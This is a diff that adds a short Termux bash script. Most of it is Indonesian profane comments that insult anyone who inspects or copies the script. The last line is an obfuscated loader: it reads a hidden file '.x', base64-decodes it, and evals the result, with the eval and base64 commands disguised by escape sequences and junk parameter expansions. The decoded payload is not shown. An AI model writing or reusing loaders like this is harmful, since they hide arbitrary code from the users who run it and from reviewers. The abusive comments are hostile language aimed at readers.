@@ -1,0 +1,13 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# MAU APA LIAT² NJINKK
+# MAU RECODE YA BANGSATT
+# MASTAH KO RECODE NJING NGAKAK
+# GAK PUNYA MALU YA KONTOL
+# SKILL BACOT BUANG AJA KE TONG SAMPAH
+# BACOT DI GEDEIN SKILL KEK TAI
+# MIKIR GOBLOK BERUSAHA SENDIRI
+# JAN CUMAN LIAT SCRIPT ORANG
+# TERUS LU TIRU KAN GOBLOK NYA AMPE KE UBUN²
+# BERUSAHA SENDIRI ANJINK REAL HASIK SENDIRI
+# BUKAN HASIL LIAT² SC ORANG BANGSATT
+n=$(cat .x);  ${@/wJDGbK8p}  $'\u0065'$'\u0076a\154'  "$(  ${!*}  "${@^}"   "p"r''i${*%%4Y2\[}nt"f"  "${n}"   ${*~}   ${*//\[b<F-L\`+/XD*NCl-}   | ${*,}   ''b""\a''${*^^}se64 -d ${@~}   )"   "${@}" 
